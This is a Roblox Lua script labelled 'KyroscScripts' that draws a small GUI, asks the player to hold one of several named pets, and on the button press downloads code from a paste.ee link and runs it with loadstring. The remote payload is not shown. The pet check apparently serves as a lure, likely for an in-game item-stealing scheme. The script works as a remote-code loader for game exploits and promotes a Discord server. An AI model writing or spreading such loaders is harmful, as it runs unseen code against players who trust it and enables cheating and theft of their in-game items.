local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer
local gui = player:WaitForChild("PlayerGui")

-- ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "KyroscScriptsGUI"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = gui

-- Frame Utama
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 320, 0, 200)
mainFrame.Position = UDim2.new(0.5, -160, 0.5, -100)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = mainFrame

-- Judul
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Text = "KyroscScripts (v3.2.1)"
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 17
title.Parent = mainFrame

-- Pet Instructions
local petInstructions = Instance.new("TextLabel")
petInstructions.Name = "PetInstructions"
petInstructions.Text = "Hold one of these pets:\n- Red Fox - Dragonfly\n- Raccoon - Praying Mantis\n- Deer"
petInstructions.Size = UDim2.new(0.9, 0, 0, 80)
petInstructions.Position = UDim2.new(0.05, 0, 0, 45)
petInstructions.BackgroundTransparency = 1
petInstructions.TextColor3 = Color3.fromRGB(200, 200, 200)
petInstructions.Font = Enum.Font.Gotham
petInstructions.TextSize = 13
petInstructions.TextXAlignment = Enum.TextXAlignment.Left
petInstructions.TextYAlignment = Enum.TextYAlignment.Top
petInstructions.Parent = mainFrame

-- Tombol Start
local startButton = Instance.new("TextButton")
startButton.Name = "StartButton"
startButton.Text = "Start Execution"
startButton.Size = UDim2.new(0.9, 0, 0, 40)
startButton.Position = UDim2.new(0.05, 0, 0, 135)
startButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
startButton.BorderSizePixel = 0
startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
startButton.Font = Enum.Font.GothamBold
startButton.TextSize = 15
startButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = startButton

-- Footer
local footer = Instance.new("TextLabel")
footer.Name = "Footer"
footer.Text = "KyroscScripts | discord.gg/SqqvAH7nXf"
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -20)
footer.BackgroundTransparency = 1
footer.TextColor3 = Color3.fromRGB(150, 150, 150)
footer.Font = Enum.Font.Gotham
footer.TextSize = 12
footer.Parent = mainFrame

-- Fungsi Notifikasi
local function showNotification(message, color)
    local notification = Instance.new("TextLabel")
    notification.Name = "Notification"
    notification.Text = message
    notification.Size = UDim2.new(0.8, 0, 0, 40)
    notification.Position = UDim2.new(0.5, 0, 0, -50)
    notification.AnchorPoint = Vector2.new(0.5, 0)
    notification.BackgroundColor3 = color
    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
    notification.Font = Enum.Font.GothamBold
    notification.TextSize = 14
    notification.Parent = mainFrame
    
    local notifCorner = Instance.new("UICorner")
    notifCorner.CornerRadius = UDim.new(0, 6)
    notifCorner.Parent = notification
    
    task.delay(3, function()
        notification:Destroy()
    end)
end

-- Fungsi Validasi Pet
local function hasValidPet()
    local character = player.Character or player.CharacterAdded:Wait()
    local validPets = { "Red Fox", "Raccoon", "Dragonfly", "Praying Mantis", "Deer" }

    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") and table.find(validPets, tool.Name) then
            return true
        end
    end

    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool") and table.find(validPets, tool.Name) then
                return true
            end
        end
    end

    return false
end

-- Fungsi Eksekusi
local function executeExternalScript()
    showNotification("Checking for pets...", Color3.fromRGB(0, 100, 255))

    if not hasValidPet() then
        showNotification("No valid pet found!", Color3.fromRGB(255, 50, 50))
        return
    end

    showNotification("Executing script...", Color3.fromRGB(0, 150, 0))

    local success, err = pcall(function()
        local code = HttpService:GetAsync("https://paste.ee/r/s7TguhY5")
        assert(code and #code > 0, "Failed to fetch script")
        loadstring(code)()
    end)

    if success then
        showNotification("Script executed!", Color3.fromRGB(0, 200, 0))
    else
        showNotification("Error: " .. tostring(err), Color3.fromRGB(255, 50, 50))
        warn("Execution error: " .. tostring(err))
    end
end

-- Trigger tombol
startButton.MouseButton1Click:Connect(executeExternalScript)
